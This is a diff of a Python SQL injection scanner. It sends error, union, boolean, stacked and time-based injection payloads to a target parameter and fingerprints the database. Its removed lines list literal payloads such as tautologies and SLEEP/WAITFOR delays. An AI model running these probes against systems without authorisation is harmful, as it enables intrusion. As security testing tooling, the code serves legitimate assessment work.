@@ -1,6 +1,15 @@
-import re
+import re, time
 from typing import Optional
 import requests
+
+from tools.log_utils import get_logger
+from tools.http_client import build_url
+from tools.payload_engine import (
+    generate_sqli_error, generate_sqli_boolean,
+    generate_sqli_time, generate_sqli_union, generate_sqli_stacked,
+)
+
+logger = get_logger("sql_injection")
 
 SQLI_ERROR_PATTERNS = [
     r"SQL syntax.*MySQL",
@@ -29,74 +38,94 @@ SQLI_ERROR_PATTERNS = [
     r"unclosed quotation mark",
     r"Unterminated string literal",
     r"quoted string not properly terminated",
-]
-
-BOOLEAN_PAYLOADS = [
-    ("' AND '1'='1", "' AND '1'='2"),
-    ("' AND 1=1-- ", "' AND 1=2-- "),
-    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
-    ("\" AND 1=1-- ", "\" AND 1=2-- "),
-    (") AND 1=1-- ", ") AND 1=2-- "),
-    ("') AND 1=1-- ", "') AND 1=2-- "),
-]
-
-TIME_PAYLOADS = [
-    "' OR SLEEP(3)-- ",
-    "' WAITFOR DELAY '0:0:3'-- ",
-    "'; WAITFOR DELAY '0:0:3'-- ",
-    "' OR pg_sleep(3)-- ",
-    "') OR pg_sleep(3)-- ",
-]
-
-ERROR_PAYLOADS = [
-    "'",
-    "\"",
-    "')",
-    "'))",
-    "\\'",
-    "\"",
-    "`",
-    "' OR '1'='1",
-    "' OR 1=1-- ",
-    "'; SELECT 1-- ",
+    r"Syntax error or access violation",
+    r"mysql_fetch",
+    r"mysqli_fetch",
+    r"supplied argument is not a valid MySQL",
+    r"Division by zero.*SQL",
+    r"Data truncated",
+    r"Column count doesn't match",
+    r"Table '[^']+' doesn't exist",
 ]
 
 
 def check(url: str, param: str, sess: Optional[requests.Session] = None,
-          timeout: float = 10.0, post_body: bool = False, post_data: dict = None) -> dict:
+          timeout: float = 10.0, post_body: bool = False, post_data: dict = None,
+          waf_name: Optional[str] = None) -> dict:
     if sess is None:
         sess = requests.Session()
-    result = {"vulnerable": False, "type": None, "evidence": [], "vector": None}
+    result = {"vulnerable": False, "type": None, "evidence": [], "vector": None, "dbms": None}
+
+    ctx = "numeric" if param and param.lower() in ("id", "uid", "pid", "page", "limit", "offset") else "string"
 
     if post_body and post_data:
         base_data = post_data.copy()
     else:
         base_data = None
 
-    for payload in ERROR_PAYLOADS:
+    def _do_req(payload):
+        if post_data:
+            d = base_data.copy() if base_data else {}
+            d[param] = payload
+            return sess.post(url, data=d, timeout=timeout, verify=False)
+        else:
+            return sess.get(build_url(url, param, payload),
+                           timeout=timeout, verify=False)
+
+    error_payloads = generate_sqli_error(ctx, waf_name)
+    for payload in error_payloads:
         try:
-            if post_data:
-                d = base_data.copy() if base_data else {}
-                d[param] = payload
-                r = sess.post(url, data=d, timeout=timeout, verify=False)
-            else:
-                sep = "&" if "?" in url else "?"
-                r = sess.get("%s%s%s=%s" % (url, sep, param, payload),
-                             timeout=timeout, verify=False)
+            r = _do_req(payload)
             for p in SQLI_ERROR_PATTERNS:
                 if re.search(p, r.text, re.IGNORECASE):
                     result["vulnerable"] = True
                     result["type"] = "error"
                     result["evidence"].append(payload[:40])
                     result["vector"] = payload
+                    if "MySQL" in p or "mysql" in p:
+                        result["dbms"] = "MySQL"
+                    elif "Oracle" in p:
+                        result["dbms"] = "Oracle"
+                    elif "PostgreSQL" in p or "pg_" in p:
+                        result["dbms"] = "PostgreSQL"
+                    elif "SQLite" in p:
+                        result["dbms"] = "SQLite"
+                    elif "SQL Server" in p or "mssql" in p:
+                        result["dbms"] = "MSSQL"
                     break
-        except:
-            pass
+        except Exception as e:
+            logger.debug("sqli error payload %s: %s", payload[:20], e)
         if result["vulnerable"]:
-            break
+            return result
 
     if not result["vulnerable"]:
-        for true_p, false_p in BOOLEAN_PAYLOADS:
+        union_payloads = generate_sqli_union(ctx, waf_name)
+        for payload in union_payloads:
+            try:
+                r = _do_req(payload)
+                for p in SQLI_ERROR_PATTERNS:
+                    if re.search(p, r.text, re.IGNORECASE):
+                        result["vulnerable"] = True
+                        result["type"] = "error_union"
+                        result["evidence"].append("union: %s" % payload[:30])
+                        result["vector"] = payload
+                        result["dbms"] = guess_dbms(r.text)
+                        break
+            except Exception as e:
+                logger.debug("sqli union %s: %s", payload[:20], e)
+            if result["vulnerable"]:
+                return result
+
+    if not result["vulnerable"]:
+        baseline_len = 0
+        try:
+            bl = _do_req("1")
+            baseline_len = len(bl.text)
+        except Exception:
+            pass
+
+        bool_pairs = generate_sqli_boolean(ctx, waf_name)
+        for true_p, false_p in bool_pairs:
             try:
                 if post_data:
                     d = base_data.copy() if base_data else {}
@@ -105,45 +134,85 @@ def check(url: str, param: str, sess: Optional[requests.Session] = None,
                     d[param] = false_p
                     r_false = sess.post(url, data=d, timeout=timeout, verify=False)
                 else:
-                    sep = "&" if "?" in url else "?"
-                    r_true = sess.get("%s%s%s=%s" % (url, sep, param, true_p),
+                    r_true = sess.get(build_url(url, param, true_p),
                                       timeout=timeout, verify=False)
-                    r_false = sess.get("%s%s%s=%s" % (url, sep, param, false_p),
+                    r_false = sess.get(build_url(url, param, false_p),
                                        timeout=timeout, verify=False)
                 diff = abs(len(r_true.text) - len(r_false.text))
-                if diff > 20 or r_true.status_code != r_false.status_code:
+                max_len = max(len(r_true.text), len(r_false.text), 1)
+                ratio = diff / max_len
+                if r_true.status_code != r_false.status_code:
                     result["vulnerable"] = True
+                elif ratio > 0.05 and diff > max(20, baseline_len * 0.02):
+                    result["vulnerable"] = True
+                if result["vulnerable"]:
                     result["type"] = "boolean"
-                    result["evidence"].append("bool: %s" % true_p[:30])
+                    result["evidence"].append("bool: %s (diff=%d, ratio=%.2f%%)" % (
+                        true_p[:25], diff, ratio * 100))
                     result["vector"] = true_p
                     break
-            except:
-                pass
+            except Exception as e:
+                logger.debug("sqli boolean %s: %s", true_p[:20], e)
         if result["vulnerable"]:
             return result
 
     if not result["vulnerable"]:
-        for payload in TIME_PAYLOADS:
+        stacked_payloads = generate_sqli_stacked(ctx, waf_name)
+        for payload in stacked_payloads:
             try:
+                r = _do_req(payload)
+                if r.status_code < 500:
+                    for p in SQLI_ERROR_PATTERNS:
+                        if re.search(p, r.text, re.IGNORECASE):
+                            result["vulnerable"] = True
+                            result["type"] = "stacked_error"
+                            result["evidence"].append("stacked: %s" % payload[:25])
+                            result["vector"] = payload
+                            break
+            except Exception as e:
+                logger.debug("sqli stacked %s: %s", payload[:20], e)
+            if result["vulnerable"]:
+                return result
+
+    if not result["vulnerable"]:
+        time_payloads = generate_sqli_time(waf_name)
+        for payload in time_payloads:
+            try:
+                start_t = time.time()
                 if post_data:
                     d = base_data.copy() if base_data else {}
                     d[param] = payload
-                    start = __import__("time").time()
-                    sess.post(url, data=d, timeout=timeout + 2, verify=False)
-                    elapsed = __import__("time").time() - start
+                    r = sess.post(url, data=d, timeout=timeout + 3, verify=False)
                 else:
-                    sep = "&" if "?" in url else "?"
-                    start = __import__("time").time()
-                    sess.get("%s%s%s=%s" % (url, sep, param, payload),
-                             timeout=timeout + 2, verify=False)
-                    elapsed = __import__("time").time() - start
-                if elapsed >= 2.5:
+                    r = sess.get(build_url(url, param, payload),
+                                timeout=timeout + 3, verify=False)
+                elapsed = time.time() - start_t
+                if elapsed >= 2.0:
                     result["vulnerable"] = True
                     result["type"] = "time"
                     result["evidence"].append("time: %.1fs" % elapsed)
                     result["vector"] = payload
+                    if "SLEEP" in payload:
+                        result["dbms"] = "MySQL"
+                    elif "pg_sleep" in payload:
+                        result["dbms"] = "PostgreSQL"
+                    elif "WAITFOR" in payload:
+                        result["dbms"] = "MSSQL"
                     break
-            except:
-                pass
+            except Exception as e:
+                logger.debug("sqli time %s: %s", payload[:20], e)
 
     return result
+
+
+def guess_dbms(text: str) -> Optional[str]:
+    for pat, name in [
+        (r"mysql|MariaDB", "MySQL/MariaDB"),
+        (r"postgresql|pg_|PSQLException", "PostgreSQL"),
+        (r"ORA-\d{5}|oracle", "Oracle"),
+        (r"sqlite|SQLite", "SQLite"),
+        (r"mssql|sql server|OLE DB|SqlException", "MSSQL"),
+    ]:
+        if re.search(pat, text, re.IGNORECASE):
+            return name
+    return None
